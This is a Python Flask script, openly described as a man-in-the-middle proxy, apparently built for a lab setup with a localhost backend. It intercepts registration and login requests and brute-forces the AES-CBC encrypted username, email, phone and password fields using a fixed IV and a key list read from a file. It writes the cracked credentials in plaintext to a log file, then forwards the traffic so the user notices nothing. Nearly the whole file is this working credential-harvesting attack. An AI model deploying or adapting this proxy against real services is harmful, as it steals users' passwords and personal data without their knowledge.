from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import logging
import requests
from datetime import datetime

from base64 import b64decode
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import re

# Configure logging: write intercepted data to mitm_capture.log and output to console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler("mitm_capture.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)
CORS(app)

# Real backend service address
TARGET_BACKEND = "http://127.0.0.1:5000"

# AES IV (matching front-end configuration)
IV_BYTES = b'6543210987654321'

# Simple plaintext validity check
def is_valid_plaintext(text: str) -> bool:
    return bool(re.match(r'^[\u4e00-\u9fa5A-Za-z0-9@._\-]+$', text))

# Brute-force decryption of Base64-encoded fields using keys from file
def brute_force_decrypt(enc_b64: str) -> str:
    cipher_bytes = b64decode(enc_b64)

    with open('brute force keys.txt', 'r', encoding='utf-8') as f:
        for line in f:
            key_candidate_hex = line.strip()
            try:
                key_candidate = bytes.fromhex(key_candidate_hex)
                cipher = Cipher(algorithms.AES(key_candidate), modes.CBC(IV_BYTES))
                decryptor = cipher.decryptor()
                padded = decryptor.update(cipher_bytes) + decryptor.finalize()
                unpadder = padding.PKCS7(128).unpadder()
                data = unpadder.update(padded) + unpadder.finalize()
                plaintext = data.decode('utf-8')
                if is_valid_plaintext(plaintext):
                    return plaintext
            except Exception:
                continue
    raise ValueError("Failed to brute-force decrypt with provided keys")

@app.route('/register', methods=['POST'])
def mitm_register():
    data = request.get_json(force=True)
    if not data:
        return jsonify({"message": "No data received"}), 400

    # Intercept and brute-force decrypt fields
    try:
        dec_username = brute_force_decrypt(data.get("username", ""))
        dec_email    = brute_force_decrypt(data.get("email", ""))
        dec_phone    = brute_force_decrypt(data.get("phone", "")) if data.get("phone") else ""
        dec_password = brute_force_decrypt(data.get("password", ""))
    except Exception as e:
        app.logger.error("Brute-force decryption failed: %s", e)
        return jsonify({"message": "Decryption failed"}), 400

    # Log the decrypted results with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = (
        f"{timestamp} - [REGISTER][BRUTE-CRACKED] "
        f"username: {dec_username}, email: {dec_email}, phone: {dec_phone}, password: {dec_password}\n"
    )
    try:
        with open("mitm_capture.log", "a", encoding="utf-8") as log_file:
            log_file.write(log_line)
    except Exception as e:
        app.logger.error("Error writing to log: %s", e)

    # Forward original encrypted data to backend
    if TARGET_BACKEND:
        forward_url = f"{TARGET_BACKEND}/register"
        try:
            resp = requests.post(forward_url, json=data, timeout=5)
        except Exception as e:
            app.logger.error("Error forwarding register request: %s", e)
            return jsonify({"message": "Forwarding request failed"}), 502

        upstream = Response(resp.content, status=resp.status_code)
        if 'Content-Type' in resp.headers:
            upstream.headers['Content-Type'] = resp.headers['Content-Type']
        return upstream
    else:
        return jsonify({"message": "Request intercepted (not forwarded)"}), 200

@app.route('/login', methods=['POST'])
def mitm_login():
    data = request.get_json(force=True)
    if not data:
        return jsonify({"message": "No data received"}), 400

    # Brute-force decrypt login fields
    try:
        dec_identifier = brute_force_decrypt(data.get("email", ""))
        dec_password   = brute_force_decrypt(data.get("password", ""))
    except Exception as e:
        app.logger.error("Brute-force decryption failed: %s", e)
        return jsonify({"message": "Decryption failed"}), 400

    # Log decrypted login data with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = (
        f"{timestamp} - [LOGIN][BRUTE-CRACKED] "
        f"identifier: {dec_identifier}, password: {dec_password}\n"
    )
    try:
        with open("mitm_capture.log", "a", encoding="utf-8") as log_file:
            log_file.write(log_line)
    except Exception as e:
        app.logger.error("Error writing to log: %s", e)

    # Forward original encrypted data to backend
    if TARGET_BACKEND:
        forward_url = f"{TARGET_BACKEND}/login"
        try:
            resp = requests.post(forward_url, json=data, timeout=5)
        except Exception as e:
            app.logger.error("Error forwarding login request: %s", e)
            return jsonify({"message": "Forwarding request failed"}), 502

        upstream = Response(resp.content, status=resp.status_code)
        if 'Content-Type' in resp.headers:
            upstream.headers['Content-Type'] = resp.headers['Content-Type']
        return upstream
    else:
        return jsonify({"message": "Request intercepted (not forwarded)"}), 200

@app.route('/')
def index():
    return "MITM proxy service is running. Please use the front end to initiate register/login requests."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081, debug=True)
